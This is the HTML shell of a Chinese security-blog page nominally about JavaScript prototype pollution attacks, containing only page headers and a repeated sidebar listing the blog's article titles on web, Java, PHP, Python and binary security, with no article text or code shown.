<!DOCTYPE html>
<html lang="zh-CN">

<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>

    
      <link rel="icon" href="/kanxi.jpg">
    

    <title>
        
          浅析JavaScript原型链污染攻击 - Mi1k7ea
        
    </title>

    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- Noto Sans TC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
    <!-- Noto Sans SC -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
    <!-- Noto Sans -->
    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">

    <!-- theme css & js -->
    <link rel="stylesheet" href="/css/book.css">
    <script src="/js/book.js"></script>

    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('img')
})
</script>

</head>

<body>

<div class="container">
  <div class="book-container">
    <div class="columns">
      <div class="column col-2 hide-lg">
        <div class="book-sidebar">
  <h4 class="site-meta">
    <a href="/">Mi1k7ea</a>
  </h4>
  <div class="sidebar-content">
    <ul>
<li><strong>Web安全</strong><ul>
<li>Web安全基础&amp;Tricks<ul>
<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
</ul>
</li>
<li>Web安全之机器学习</li>
<li>WriteUp Web<ul>
<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Java</strong><ul>
<li>Java安全<ul>
<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
</ul>
</li>
<li>Struts2</li>
<li>Spring<ul>
<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
</ul>
</li>
<li>SpringCloud</li>
</ul>
</li>
<li><strong>PHP</strong><ul>
<li>PHP安全<ul>
<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
</ul>
</li>
<li>CMS</li>
</ul>
</li>
<li><strong>Python</strong><ul>
<li>Python安全<ul>
<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
</ul>
</li>
<li>安全开发<ul>
<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
</ul>
</li>
<li>爬虫</li>
<li>Django</li>
</ul>
</li>
<li><strong>JavaScript</strong><ul>
<li>JavaScript安全<ul>
<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
</ul>
</li>
<li>NodeJS</li>
<li>AngularJS</li>
</ul>
</li>
<li><strong>GO</strong><ul>
<li>GO安全</li>
</ul>
</li>
<li><strong>二进制安全</strong><ul>
<li>二进制基础<ul>
<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
</ul>
</li>
<li>C/C++<ul>
<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
</ul>
</li>
<li>逆向工程</li>
<li>Fuzzing</li>
<li>Pwn<ul>
<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
</ul>
</li>
<li>WriteUp Pwn<ul>
<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
</ul>
</li>
<li>WriteUp Reverse<ul>
<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>渗透测试</strong><ul>
<li>基础&amp;Tricks</li>
<li>Kali</li>
<li>Metasploit</li>
<li>内网渗透</li>
<li>提权<ul>
<li><a href="/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
<li><a href="/2019/11/28/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
</ul>
</li>
<li>免杀</li>
<li>工具</li>
</ul>
</li>
<li><strong>OS</strong><ul>
<li>Windows<ul>
<li><a href="/2019/11/28/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
<li><a href="/2019/11/28/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
</ul>
</li>
<li>Linux</li>
</ul>
</li>
</ul>

  </div>
</div>

<script src="/js/book-sidebar.js"></script>

<script>
collapse_sidebar(2)
highlight_tab()
show_sidebar()
</script>
      </div>

      <div class="column col-8 col-lg-12">
        <div class="book-content">
          <div class="book-navbar">
  <header class="navbar">
  <section class="navbar-section">
    <img class="navbar-icon" src="/kanxi.jpg">
  </section>
  <section class="navbar-center">
    Mi1k7ea
  </section>
  <section class="navbar-section">
    <label class="accordion-header c-hand" for="accordion-sidebar">
      <i class="icon icon-menu"></i>
    </label>
  </section>
</header>

<div class="accordion">
  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
  <div class="accordion-body">
    <ul>
<li><strong>Web安全</strong><ul>
<li>Web安全基础&amp;Tricks<ul>
<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
</ul>
</li>
<li>Web安全之机器学习</li>
<li>WriteUp Web<ul>
<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Java</strong><ul>
<li>Java安全<ul>
<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
</ul>
</li>
<li>Struts2</li>
<li>Spring<ul>
<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li>
</ul>
</li>
<li>SpringCloud</li>
</ul>
</li>
<li><strong>PHP</strong><ul>
<li>PHP安全<ul>
<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
</ul>
</li>
<li>CMS</li>
</ul>
</li>
<li><strong>Python</strong><ul>
<li>Python安全<ul>
<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
</ul>
</li>
<li>安全开发<ul>
<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
</ul>
</li>
<li>爬虫</li>
<li>Django</li>
</ul>
</li>
<li><strong>JavaScript</strong><ul>
<li>JavaScript安全<ul>
<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
</ul>
</li>
<li>NodeJS</li>
<li>AngularJS</li>
</ul>
</li>
<li><strong>GO</strong><ul>
<li>GO安全</li>
</ul>
</li>
<li><strong>二进制安全</strong><ul>
<li>二进制基础<ul>
<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
</ul>
</li>
<li>C/C++<ul>
<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
</ul>
</li>
<li>逆向工程</li>
<li>Fuzzing</li>
<li>Pwn<ul>
<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
</ul>
</li>
<li>WriteUp Pwn<ul>
<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
</ul>
</li>
<li>WriteUp Reverse<ul>
<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>渗透测试</strong><ul>
<li>基础&amp;Tricks</li>
<li>Kali</li>
<li>Metasploit</li>
<li>内网渗透</li>
<li>提权<ul>
<li><a href="/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
<li><a href="/2019/11/28/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
</ul>
</li>
<li>免杀</li>
<li>工具</li>
</ul>
</li>
<li><strong>OS</strong><ul>
<li>Windows<ul>
<li><a href="/2019/11/28/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
<li><a href="/2019/11/28/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
</ul>
</li>
<li>Linux</li>
</ul>
</li>
